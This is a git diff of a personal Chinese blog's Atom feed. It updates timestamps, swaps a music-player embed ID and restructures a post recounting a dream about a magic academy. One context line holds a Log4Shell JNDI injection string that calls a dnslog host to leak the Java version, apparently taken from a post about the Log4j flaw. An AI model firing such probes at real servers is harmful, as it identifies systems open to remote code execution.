@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">falcone&#39;s sweet home</title>
     <subtitle type="html">MemE 是一个强大且可高度定制的 GoHugo 博客主题，专为个人博客设计。</subtitle>
-    <updated>2023-11-16T20:43:07&#43;08:00</updated>
+    <updated>2023-11-19T15:28:18&#43;08:00</updated>
     <id>https://xuoneyuan.github.io/</id>
     <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://xuoneyuan.github.io/atom.xml" />
@@ -20,7 +20,7 @@
             <title type="text">关于个人头像版本更新的公告</title>
             <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/6/" />
             <id>https://xuoneyuan.github.io/posts/6/</id>
-            <updated>2023-11-16T15:11:09&#43;08:00</updated>
+            <updated>2023-11-19T15:22:19&#43;08:00</updated>
             <published>2023-11-16T13:52:03&#43;08:00</published>
             <author>
                     <name>falcone</name>
@@ -29,7 +29,7 @@
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">在开始前我忍不住想吐槽一下网易云，现在的网易云中文歌少就算了，vip歌曲越来越多我也……</summary>
             
-                <content type="html">&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=1365898499&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
+                <content type="html">&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=433107530&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
 &lt;p&gt;在开始前我忍不住想吐槽一下网易云，现在的网易云中文歌少就算了，vip歌曲越来越多我也忍了，可是我即便是开了黑胶，依然解决不了外部引用的问题。下载一首vip歌曲，只能在网易云上听，想要在博客引用一首歌，它检测到vip曲库就会禁止播放。实在没办法啊，原本我想用spotify来替代网易云，奈何我低估了国外的资本家赚钱的能力，倒腾了半天又折回网易云来了。&lt;/p&gt;
 &lt;h4 id=&#34;background&#34;&gt;Background&lt;/h4&gt;
 &lt;p&gt;让我们把时间线拨回到2023年9月28日，星期四，国庆放假前一天。很不幸，本人在这天的课有足足两节之多。为了打发时间，无聊的我决定打开三星画板开始画画&lt;/p&gt;
@@ -356,16 +356,20 @@ ${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
             <title type="text">时间静止</title>
             <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/3/" />
             <id>https://xuoneyuan.github.io/posts/3/</id>
-            <updated>2023-11-13T18:50:05&#43;08:00</updated>
+            <updated>2023-11-19T15:19:53&#43;08:00</updated>
             <published>2023-11-10T14:31:54&#43;08:00</published>
             <author>
                     <name>falcone</name>
                     <uri>https://xuoneyuan.github.io/</uri>
                     <email>xuoneyuan@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生物多……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">BGM CONTENT 可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生……</summary>
             
-                <content type="html">&lt;p&gt;可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生物多出来的那个坐标轴就是时间轴，我会时间静止也就意味我完成了维度进化233。今天早上就做了一个梦，我来到了一座魔法学院，学习的就是时间静止魔法。我本来毫无目的在学校里面乱逛的时候突然发现了一座城堡，哥特式建筑。在这座城堡的阳台，有一个合唱团正在演出，我站在城堡窗户的外檐（就是空调师傅装外机的位置），旁边还站着一排人，大家都在静静地听合唱团演奏，首先是一个儿童合唱团，童声非常清澈空灵，引得我旁边的两个女孩子赞叹不已（醒来时我发现完全不认识这两个女生）。然后又换了一个合唱团，这次是中央音乐学院的学生前来演奏。正当我在安静欣赏的时候我发现了两个高中同学，于是接下来我就跳到了地面上，随后左拐一路小跑进入了城堡内部，眼前是一片宽阔的长廊，没有怪物，没有敌人，我一下子反应过来我应该是走错了，于是我往回跑，进入了另一个大门。当我下楼梯时突然转角遇到爱，一个boss出现在我面前，我们两个马上交手，刚刚打了两个回合，我就醒来了。&lt;/p&gt;
+                <content type="html">&lt;h4 id=&#34;bgm&#34;&gt;BGM&lt;/h4&gt;
+&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=1365898499&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;content&#34;&gt;CONTENT&lt;/h4&gt;
+&lt;p&gt;可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生物多出来的那个坐标轴就是时间轴，我会时间静止也就意味我完成了维度进化233。今天早上就做了一个梦，我来到了一座魔法学院，学习的就是时间静止魔法。我本来毫无目的在学校里面乱逛的时候突然发现了一座城堡，哥特式建筑。在这座城堡的阳台，有一个合唱团正在演出，我站在城堡窗户的外檐（就是空调师傅装外机的位置），旁边还站着一排人，大家都在静静地听合唱团演奏，首先是一个儿童合唱团，童声非常清澈空灵，引得我旁边的两个女孩子赞叹不已（醒来时我发现完全不认识这两个女生）。然后又换了一个合唱团，这次是中央音乐学院的学生前来演奏。正当我在安静欣赏的时候我发现了两个高中同学，于是接下来我就跳到了地面上，随后左拐一路小跑进入了城堡内部，眼前是一片宽阔的长廊，没有怪物，没有敌人，我一下子反应过来我应该是走错了，于是我往回跑，进入了另一个大门。当我下楼梯时突然转角遇到爱，一个boss出现在我面前，我们两个马上交手，刚刚打了两个回合，我就醒来了。&lt;/p&gt;
 &lt;p&gt;醒来以后后知后觉，因为那个敌人（四个字，具体叫什么忘了）身穿铠甲，手持一把画戟，而我是赤手空拳，论近战我肯定不是他的对手，顿时庆幸我及时醒了，要不然我哪里打得过他，必须得溜了。现在复盘下来这座城堡里长廊的原型应该是韦伯·维尔维特所在的学院（《君主·埃尔梅罗二世事件簿》的男主）和秀知院（《辉夜大小姐想让我告白》背景学校）的结合，进城堡前的外观原型是《艾尔登法环》里雷亚卢卡利亚魔法学院和王城罗德尔的结合，楼梯转角具体是哪里实在是无从考证，没有灯，只有一些火把来照亮视线，而且楼梯不是木质的是不锈钢做的，刷了一层暗红色油漆，踩在上面有清脆的噔噔噔金属撞击声，boss长得有一点像失乡骑士，但是更矮，铠甲是黄铜色的。&lt;/p&gt;
 &lt;p&gt;后面又有一点失落，我的一切想象都是基于现实中已经存在的游戏、动漫、音乐形成的，还是没有脱离现实的桎梏，醒来后我还是一个地球人，不是三体人，没有水滴，在浩瀚无垠的宇宙中进行着不知道要去向何方的孤独流浪。&lt;/p&gt;
 </content>
